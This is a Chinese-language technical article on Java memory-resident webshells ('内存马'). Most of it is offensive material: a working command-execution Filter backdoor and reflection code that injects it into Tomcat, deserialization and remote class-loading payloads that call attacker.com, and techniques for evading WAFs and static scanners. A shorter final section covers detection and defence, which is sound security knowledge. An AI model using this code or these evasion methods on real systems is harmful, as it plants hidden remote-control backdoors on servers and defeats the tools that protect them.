引言

在Web安全领域，Webshell一直是攻击者获取服务器持久化控制的重要手段。传统Webshell以文件形式存在于服务器磁盘，通过HTTP协议与攻击者交互，实现命令执行、文件管理等功能。然而，随着主机安全软件（如D盾、河马）、Web应用防火墙（WAF）以及流量监控设备的普及，文件型Webshell的生存空间被急剧压缩——文件落地易被查杀，明文流量易被拦截。于是，攻击者开始探索无文件攻击技术，内存马（Memory WebShell）应运而生。

内存马是一种完全驻留在内存中、不写入磁盘的Webshell，其生命周期与Web容器（如Tomcat、Jetty）或Web应用同步。它通过动态注册路由或组件的方式，将恶意逻辑注入到正常的请求处理流程中，从而在每次HTTP请求时触发执行。这种技术不仅绕过了文件扫描引擎，还能通过加密流量与C2（命令控制服务器）通信，极大地增强了隐蔽性。

本文将以Java语言为例，深入剖析内存马的实现原理、注入方式、免杀技巧以及检测防御手段，带领读者领略攻防双方在这一领域的激烈博弈。

---

一、内存马技术概述

1.1 什么是内存马

内存马，顾名思义，是一种仅在内存中存活的后门程序。它不依赖任何磁盘文件，而是利用Web容器的动态注册机制，在运行时将恶意代码注入到现有的组件（如Servlet、Filter、Listener）中，或创建新的路由映射。当攻击者构造特定的HTTP请求访问该路由时，恶意代码即被执行。

1.2 内存马的出现背景

传统Webshell的弱点非常明显：

· 文件落地：磁盘上存在脚本文件，极易被主机安全软件扫描查杀。
· 流量特征：明文传输命令或加密特征固定（如冰蝎的AES密钥），易被流量设备识别。
· 行为痕迹：文件创建时间、修改时间等元数据暴露攻击行为。

内存马的出现正是为了对抗这些检测手段。它利用Web容器本身的功能，将后门伪装成正常业务逻辑的一部分，实现了“无文件、无特征、无痕迹”的隐蔽效果。

1.3 内存马的通用原理

内存马的核心思想是在Web应用的请求处理链中插入一个“钩子”。以Java Web为例，一次HTTP请求通常会经过如下组件：

```
客户端 → Listener → Filter → Servlet → 业务代码
```

其中，Filter和Servlet是植入内存马的最佳位置。攻击者通过反射或容器提供的API，动态创建一个Filter或Servlet，并将其注册到容器中，使其能够拦截特定URL的请求。当该URL被访问时，Filter或Servlet中的恶意代码便会执行，解析请求参数并执行系统命令，最后将结果返回给攻击者。

1.4 内存马的常见类型

按语言分类，内存马可存在于PHP（通过扩展）、Java（Servlet容器）、Python（WSGI）、ASP.NET（IIS）等环境中。其中，Java内存马因其生态复杂、技术细节丰富，成为攻防研究的重点。

---

二、Java内存马深入剖析

Java Web应用运行在Servlet容器（如Tomcat、Jetty、Undertow）或应用服务器（如WebLogic、WebSphere）之上，它们均提供了动态注册组件的机制。常见的Java内存马类型包括：

2.1 Servlet型内存马

Servlet是Java Web最基础的组件，负责处理HTTP请求。动态注册一个Servlet，相当于创建一个新的URL映射。攻击者只需访问该URL，即可触发恶意代码。

实现步骤：

1. 获取当前Web应用的ServletContext。
2. 通过ServletContext的addServlet方法创建自定义Servlet。
3. 为Servlet添加URL映射。

示例代码（简化版）：

```java
ServletContext servletContext = request.getSession().getServletContext();
// 创建自定义Servlet
Servlet servlet = new HttpServlet() {
    @Override
    protected void service(HttpServletRequest req, HttpServletResponse resp) {
        // 执行命令
        String cmd = req.getParameter("cmd");
        try {
            Process process = Runtime.getRuntime().exec(cmd);
            // 输出结果...
        } catch (Exception e) {}
    }
};
// 动态注册
ServletRegistration.Dynamic dynamic = servletContext.addServlet("evil", servlet);
dynamic.addMapping("/evil");
```

2.2 Filter型内存马

Filter用于拦截请求和响应，可以在Servlet执行前后插入逻辑。由于Filter可以拦截任意URL，且注册后立即生效，因此成为内存马的首选。

实现原理：

1. 获取StandardContext（Tomcat容器中表示Web应用的对象）。
2. 创建一个FilterDef（定义Filter类）和FilterMap（映射URL）。
3. 将FilterDef和FilterMap添加到StandardContext中。
4. 实例化Filter并添加到Filter链中。

关键代码（Tomcat环境）：

```java
// 获取StandardContext
org.apache.catalina.core.StandardContext context = (StandardContext) request.getServletContext().getAttribute("org.apache.catalina.core.StandardContext");
// 创建FilterDef
FilterDef filterDef = new FilterDef();
filterDef.setFilterName("evilFilter");
filterDef.setFilterClass(EvilFilter.class.getName());
context.addFilterDef(filterDef);
// 创建FilterMap
FilterMap filterMap = new FilterMap();
filterMap.setFilterName("evilFilter");
filterMap.addURLPattern("/*");
context.addFilterMap(filterMap);
// 实例化Filter并添加到Filter链
Constructor<?> constructor = StandardContext.class.getDeclaredConstructor();
constructor.setAccessible(true);
Filter filter = (Filter) Class.forName(EvilFilter.class.getName()).newInstance();
context.getPipeline().addFilter(new ApplicationFilterConfig(context, filterDef, filter));
```

2.3 Listener型内存马

Listener监听Web事件（如会话创建、属性修改等），事件触发时执行代码。攻击者可注册一个监听器，在会话创建时执行恶意逻辑，但触发时机不如Filter灵活。

2.4 Valve/Interceptor型内存马

Tomcat的Valve（阀）位于容器管道中，可以在请求到达Servlet之前或之后执行。Spring框架中的Interceptor也是类似概念。这些组件同样可以被动态注册。

2.5 内存马的特性

· 即时生效：注入成功后，无需重启即可使用。
· 临时性：容器重启后内存马消失，但攻击者可结合持久化手段（如写入启动脚本）复活。
· 隐蔽性：无文件、无进程、常规扫描难以发现。

---

三、内存马的生成与实践

3.1 内存马生成工具

手动编写内存马需要深入理解容器内部结构，门槛较高。社区已出现多种自动化生成工具，简化了攻击流程。

· MemShellParty：支持多种容器（Tomcat、Jetty、WebLogic等）的内存马生成，提供交互式配置。
· java-memshell-generator：一款功能强大的内存马生成器，可生成不同容器、不同类型的内存马代码，并提供JSP、反序列化等多种载荷形式。

这些工具通常输出一段JSP代码或字节码，攻击者将其上传或注入后，即可在内存中植入后门。

3.2 手动实现一个Filter内存马

为了深入理解原理，我们可以手动编写一个简单的Filter内存马。

EvilFilter.java：

```java
public class EvilFilter implements Filter {
    @Override
    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) {
        HttpServletRequest req = (HttpServletRequest) request;
        HttpServletResponse resp = (HttpServletResponse) response;
        String cmd = req.getParameter("cmd");
        if (cmd != null) {
            try {
                Process process = Runtime.getRuntime().exec(cmd);
                // 读取命令结果并写入response
                java.io.InputStream in = process.getInputStream();
                java.util.Scanner s = new java.util.Scanner(in).useDelimiter("\\A");
                String result = s.hasNext() ? s.next() : "";
                resp.getWriter().write(result);
            } catch (Exception e) {}
        }
    }
}
```

注入代码（需在目标服务器执行）：

```java
// 获取StandardContext
ServletContext servletContext = request.getServletContext();
java.lang.reflect.Field contextField = servletContext.getClass().getDeclaredField("context");
contextField.setAccessible(true);
org.apache.catalina.core.ApplicationContext appContext = (org.apache.catalina.core.ApplicationContext) contextField.get(servletContext);
java.lang.reflect.Field standardContextField = appContext.getClass().getDeclaredField("context");
standardContextField.setAccessible(true);
org.apache.catalina.core.StandardContext standardContext = (org.apache.catalina.core.StandardContext) standardContextField.get(appContext);

// 创建FilterDef
org.apache.tomcat.util.descriptor.web.FilterDef filterDef = new org.apache.tomcat.util.descriptor.web.FilterDef();
filterDef.setFilterName("evilFilter");
filterDef.setFilterClass(EvilFilter.class.getName());
standardContext.addFilterDef(filterDef);

// 创建FilterMap
org.apache.tomcat.util.descriptor.web.FilterMap filterMap = new org.apache.tomcat.util.descriptor.web.FilterMap();
filterMap.setFilterName("evilFilter");
filterMap.addURLPattern("/*");
standardContext.addFilterMap(filterMap);

// 反射获取filterConfigs并添加实例
java.lang.reflect.Field filterConfigsField = standardContext.getClass().getDeclaredField("filterConfigs");
filterConfigsField.setAccessible(true);
java.util.Map filterConfigs = (java.util.Map) filterConfigsField.get(standardContext);
if (filterConfigs.get("evilFilter") == null) {
    EvilFilter evilFilter = new EvilFilter();
    javax.servlet.FilterConfig filterConfig = new org.apache.catalina.core.ApplicationFilterConfig(standardContext, filterDef, evilFilter);
    filterConfigs.put("evilFilter", filterConfig);
}
```

上述代码通过反射操作Tomcat内部对象，完成Filter的动态注册。访问任意URL并传入cmd参数即可执行命令。

3.3 配合Webshell管理工具

内存马通常作为后门，配合冰蝎、哥斯拉等Webshell管理工具使用。这些工具支持自定义连接器，攻击者可修改客户端代码，将内存马的URL和加密方式配置进去，实现加密通信，进一步规避流量检测。

---

四、内存马的注入方式：利用漏洞无文件植入

内存马生成后，如何将其植入目标服务器是关键一步。传统方式需要上传一个JSP文件，但这又回到了文件落地的老问题。因此，攻击者更倾向于直接通过漏洞执行注入代码，实现完全无文件植入。

4.1 常见漏洞入口

· 反序列化漏洞：如Fastjson、Jackson、Shiro反序列化，通过构造恶意序列化数据，触发反射逻辑注册内存马。
· SSTI（模板注入）：如Velocity、Freemarker模板注入，在模板中嵌入Java代码执行注入。
· RCE（命令执行）：如Struts2 OGNL、Elasticsearch Groovy脚本等，直接执行Java代码。

4.2 反序列化注入内存马实例

以Fastjson反序列化为例，攻击者可构造如下payload（简化）：

```json
{
    "@type": "java.lang.Runtime",
    "method": "exec",
    "args": [
        "curl http://attacker.com/inject?code=... "
    ]
}
```

但直接执行命令很难完成复杂的内存马注入。更常见的方式是利用字节码加载技术：将内存马逻辑编译为字节码，然后通过defineClass动态加载并执行。

例如，攻击者将内存马类编译成字节数组，通过反序列化执行：

```java
byte[] bytes = ...; // 从远程下载或硬编码
Method defineMethod = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
defineMethod.setAccessible(true);
Class<?> clazz = (Class<?>) defineMethod.invoke(Thread.currentThread().getContextClassLoader(), bytes, 0, bytes.length);
clazz.newInstance(); // 执行内存马注入逻辑
```

这种手法将内存马完全隐藏在字节码中，不落地磁盘，实现高隐蔽性。

---

五、代码静态免杀技术

尽管内存马绕过了文件扫描，但注入代码本身（如JSP、反序列化payload）仍需通过各种WAF和静态检测工具的筛查。因此，对内存马相关代码进行免杀处理是必备技能。

5.1 加密混淆

· XOR/AES/Base64编码：将关键字符串（如Runtime.getRuntime()）编码，运行时解码。
· 字符反转：将"txed/"反转后得到"/cmd"，避免明文出现。
· 拼接：将类名、方法名拆分成多个部分拼接，如"java.lang.Ru"+"ntime"。

示例（Base64绕过）：

```java
String cmd = new String(new sun.misc.BASE64Decoder().decodeBuffer("Y21k")); // "cmd"
Runtime.getRuntime().exec(req.getParameter(cmd));
```

5.2 利用注释

Java允许在代码中插入任意位置的注释，许多正则检测基于简单特征匹配，插入注释可破坏特征。

例如，Runtime.getRuntime().exec()可改写为：

```java
Runtime/**/.getRuntime/**/./**/exec("whoami");
```

5.3 改变特征

· 修改变量名、方法名：避免使用cmd、exec等敏感词。
· 使用包装类：用ProcessBuilder代替Runtime.exec，或使用反射调用。
· 隐式类型转换：增加冗余代码迷惑检测。

5.4 反射机制

反射可以动态获取类和方法，将直接调用转为间接调用，有效绕过基于静态调用的特征检测。

示例：

```java
Class<?> runtimeClass = Class.forName("java.lang.Runtime");
Method getRuntimeMethod = runtimeClass.getMethod("getRuntime");
Object runtime = getRuntimeMethod.invoke(null);
Method execMethod = runtimeClass.getMethod("exec", String.class);
execMethod.invoke(runtime, req.getParameter("cmd"));
```

5.5 字节码加载

使用BCEL（Byte Code Engineering Library）或Java自身的ClassLoader.defineClass动态加载恶意类。BCEL格式的类可以编码为字符串，在代码中解码并加载，完全避开对Java源文件的静态分析。

示例（BCEL）：

```java
String bcelCode = "$$BCEL$$$l..."; // BCEL编码的字节码
Class<?> clazz = Class.forName(bcelCode);
clazz.newInstance(); // 执行恶意逻辑
```

5.6 远程分离加载

将恶意类放在远程服务器上，本地仅需少量代码从远程加载并实例化。这种方式将攻击载荷与植入代码分离，本地代码极简，难以检测。

示例：

```java
URLClassLoader classLoader = new URLClassLoader(new URL[]{new URL("http://attacker.com/")});
Class<?> clazz = classLoader.loadClass("EvilMemShell");
clazz.newInstance(); // 注入内存马
```

---

六、查杀与防御

6.1 现有查杀平台

· 微步云沙箱、Virustotal：可检测已知恶意样本。
· 阿里云Webshell查杀：在线检测Webshell文件。
· 牧云、河马：主机侧Webshell扫描工具，支持静态特征匹配。
· D盾、长亭百川：国内流行的Webshell查杀工具。
· WebDir+：扫描Web目录，结合特征库检测。

6.2 查杀原理

· 静态特征匹配：基于正则表达式匹配代码中的危险函数（如eval、exec）和关键字。
· 动态行为分析：通过沙箱运行样本，监控其行为（如执行系统命令、修改文件）。
· 内存扫描：针对内存马，通过Java Agent或JVMTI扫描内存中的Class对象，检查是否存在恶意Filter/Servlet。例如，阿里巴巴的Arthas可动态查看内存中的类，可用于检测异常组件。

6.3 防御建议

1. 修复漏洞：反序列化、SSTI等漏洞是内存马注入的主要入口，及时打补丁。
2. 部署RASP：运行时应用自我保护（RASP）可在应用层监控敏感操作，如动态注册Filter、执行命令等，实时阻断攻击。
3. 内存马检测：使用Java Agent定期扫描内存中的组件，对比基线发现异常。例如，java-memshell-scanner等开源项目可检测常见内存马。
4. 最小化权限：Web应用以低权限用户运行，限制ClassLoader动态加载能力。
5. 日志审计：监控异常的URL访问、参数传递，发现可疑行为。

6.4 攻防对抗升级

防御方不断推出新的检测技术，攻击方也在不断改进免杀方法。例如，内存马已发展到多层加密、动态生成类名、使用混淆器等，甚至利用JVM的Attach机制注入到正在运行的进程中，实现更高级别的隐蔽。

---

七、总结与展望

Java内存马技术是Webshell攻防演进的重要里程碑。它以无文件、动态注册的特性，成功规避了传统基于文件的检测手段，成为红队渗透中的利器。然而，防御方也在积极研发内存扫描、RASP等新技术，试图将战场从磁盘转移到内存。

未来，随着机器学习在安全领域的应用，基于行为分析的检测可能成为主流。攻击者则可能转向更底层的技术，如修改JVM源码、利用JNI注入，甚至攻击Java Agent本身。无论如何，攻防双方的博弈将不断推动Web安全技术的进步。

对于安全从业者而言，理解内存马的原理与实现，既有助于提升攻击模拟能力，也能更好地构建纵深防御体系。只有知己知彼，才能在快速变化的安全环境中立于不败之地。

---

参考资料

· 内存马技术详解
· Java内存马从入门到实战
· 内存马查杀与对抗
· java-memshell-generator
· MemShellParty
